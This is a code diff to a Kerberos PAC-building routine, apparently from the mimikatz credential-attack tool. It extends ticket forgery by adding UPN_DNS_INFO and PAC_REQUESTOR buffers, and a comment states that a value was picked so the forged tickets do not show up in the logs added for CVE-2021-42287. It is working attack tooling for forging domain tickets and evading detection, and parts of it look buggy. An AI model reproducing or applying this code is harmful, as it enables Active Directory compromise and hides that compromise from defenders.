@@ -5,15 +5,15 @@
 */
 #include "kuhl_m_kerberos_pac.h"
 
-BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFILETIME authtime, LPCWSTR clientname, LONG SignatureType, PCLAIMS_SET pClaimsSet, PISID sid, DWORD userId, PPACTYPE * pacType, DWORD * pacLength)
+BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFILETIME authtime, LPCWSTR clientname, LONG SignatureType, PCLAIMS_SET pClaimsSet, PISID sid, DWORD userId, LPCWSTR domainname, PPACTYPE * pacType, DWORD * pacLength)
 {
 	BOOL status = FALSE;
 	PVOID pLogonInfo = NULL, pClaims = NULL;
 	PPAC_CLIENT_INFO pClientInfo = NULL;
 	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
-	DWORD n = 6, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 5 * sizeof(PAC_INFO_BUFFER);
+	DWORD n = 7, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 6 * sizeof(PAC_INFO_BUFFER);
 	PKERB_CHECKSUM pCheckSum;
-	INT pacAttributeType = 1; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
+	INT pacAttributeType = 2; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
 
 	if(NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum)))
 	{
@@ -36,34 +36,14 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 		LPCWSTR stringSid;
 		ConvertSidToStringSid(sid, &stringSid);
 		LPCWSTR userStringSidFull[100];
+		memset(userStringSidFull, 0, 100 * 2);
 		swprintf(userStringSidFull, 100, L"%s-%d", stringSid, userId );
+		wprintf(userStringSidFull);
 		PSID userSid;
 		ConvertStringSidToSid(userStringSidFull, &userSid);
-		
-
-		
-		//// Test using LookupAccountName
-		//PSID LANSid;
-		//SID_NAME_USE snu = SidTypeInvalid;
-		//BOOL bRVal;
-		//DWORD dwSidSize = SECURITY_MAX_SID_SIZE;
-		//TCHAR szDomainName[256];
-		//DWORD dwDomainSize = _tcslen(szDomainName);
-		//bRVal = LookupAccountName(
-		//	NULL, //use this system
-		//	validationInfo->EffectiveName.Buffer, //the user to look up
-		//	&LANSid, //the returned SID
-		//	&dwSidSize, //the size of the SID returned
-		//	NULL, //the returned domain name
-		//	&dwDomainSize, //the size of the domain name
-		//	&snu //the type of sid
-		//);
-		
-		// Setting up PAC_REQUESTOR
-		PAC_REQUESTOR requestor;
-		requestor.sid = userSid;
-		auto szPacRequestorsid = sizeof(PAC_REQUESTOR);
+		auto szPacRequestorsid = GetLengthSid(userSid);
 		DWORD szPacRequestorSidAligned = SIZE_ALIGN(szPacRequestorsid, 8);
+
 
 		// Setting up PAC_ATTRIBUTE_IFNO
 		PAC_ATTRIBUTES_INFO pacAttributeInfo;
@@ -93,9 +73,33 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 		DWORD szPacAttributeInfoAligned = SIZE_ALIGN(szPacAttributeInfo, 8);
 
 
+		// Making UPN
+		wchar_t domainnameConverted[24];
+		swprintf(domainnameConverted, 24, L"%s", domainname);
+		wchar_t upn[36];
+		swprintf(upn, 36, L"%s@%s", validationInfo->EffectiveName.Buffer, domainname);
+		
+
+		// Setting UPN DNS INFO
+		UPN_DNS_INFO upnDnsInfo;
+		upnDnsInfo.UpnLength = lstrlenW(upn) * 2;
+		upnDnsInfo.UpnOffset = 16;
+		upnDnsInfo.DnsDomainNameLength = validationInfo->LogonDomainName.Length * 2;
+		upnDnsInfo.DnsDomainNameOffset = upnDnsInfo.UpnLength + upnDnsInfo.UpnOffset;
+		upnDnsInfo.Flags = 0x00000000;
+
+			
+
+		auto szUpnDnsInfo = sizeof(upnDnsInfo);
+		auto szUpn = sizeof(upn);
+		auto szDomainname = sizeof(domainnameConverted);
+		DWORD szUpnAligned = SIZE_ALIGN(szUpn, 8);
+		DWORD szDomainnameAligned = SIZE_ALIGN(szDomainname, 8);
+		DWORD szUpnDnsInfoAligned = SIZE_ALIGN(szUpnDnsInfo, 8);
+
 		if(pLogonInfo && pClientInfo)
 		{
-			*pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned + szPacAttributeInfoAligned + szPacRequestorSidAligned + 2 * szSignatureAligned;
+			*pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned + szUpnDnsInfoAligned + upnDnsInfo.UpnLength + szDomainname +  szPacAttributeInfoAligned + szPacRequestorSidAligned + 2 * szSignatureAligned;
 			if(*pacType = (PPACTYPE) LocalAlloc(LPTR, *pacLength))
 			{
 				(*pacType)->cBuffers = n;
@@ -111,22 +115,29 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 				(*pacType)->Buffers[1].Offset = (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
 				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[1].Offset, pClientInfo, (*pacType)->Buffers[1].cbBufferSize);
 
-				(*pacType)->Buffers[2].cbBufferSize = szPacAttributeInfo;
-				(*pacType)->Buffers[2].ulType = PACINFO_TYPE_ATTRIBUTES_INFO;
+				(*pacType)->Buffers[2].cbBufferSize = szUpnDnsInfo + upnDnsInfo.UpnLength + szDomainname;
+				(*pacType)->Buffers[2].ulType = PACINFO_TYPE_UPN_DNS;
 				(*pacType)->Buffers[2].Offset = (*pacType)->Buffers[1].Offset + szClientInfoAligned;
-				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset, &pacAttributeInfo, (*pacType)->Buffers[2].cbBufferSize);
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset, &upnDnsInfo, (*pacType)->Buffers[2].cbBufferSize);
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned, &upn, upnDnsInfo.UpnLength);
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.UpnLength, &domainnameConverted, szDomainname);
 
-				(*pacType)->Buffers[3].cbBufferSize = szPacRequestorsid;
-				(*pacType)->Buffers[3].ulType = PACINFO_TYPE_PAC_REQUESTOR;
-				(*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szPacAttributeInfoAligned;
-				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[3].Offset, &requestor, (*pacType)->Buffers[3].cbBufferSize);
+				(*pacType)->Buffers[3].cbBufferSize = szPacAttributeInfo;
+				(*pacType)->Buffers[3].ulType = PACINFO_TYPE_ATTRIBUTES_INFO;
+				(*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.UpnLength + szDomainname;
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[3].Offset, &pacAttributeInfo, (*pacType)->Buffers[3].cbBufferSize);
+
+				(*pacType)->Buffers[4].cbBufferSize = szPacRequestorsid;
+				(*pacType)->Buffers[4].ulType = PACINFO_TYPE_PAC_REQUESTOR;
+				(*pacType)->Buffers[4].Offset = (*pacType)->Buffers[3].Offset + szPacAttributeInfoAligned;
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[4].Offset, userSid, (*pacType)->Buffers[4].cbBufferSize);
 
 				if (szClaimsAligned)
 				{
-					(*pacType)->Buffers[4].cbBufferSize = szClaims;
-					(*pacType)->Buffers[4].ulType = PACINFO_TYPE_CLIENT_CLAIMS;
-					(*pacType)->Buffers[4].Offset = (*pacType)->Buffers[3].Offset + szClientInfoAligned;
-					RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[4].Offset, pClaims, (*pacType)->Buffers[4].cbBufferSize);
+					(*pacType)->Buffers[5].cbBufferSize = szClaims;
+					(*pacType)->Buffers[5].ulType = PACINFO_TYPE_CLIENT_CLAIMS;
+					(*pacType)->Buffers[5].Offset = (*pacType)->Buffers[4].Offset + szClientInfoAligned;
+					RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[5].Offset, pClaims, (*pacType)->Buffers[5].cbBufferSize);
 				}
 
 				(*pacType)->Buffers[n - 2].cbBufferSize = szSignature;
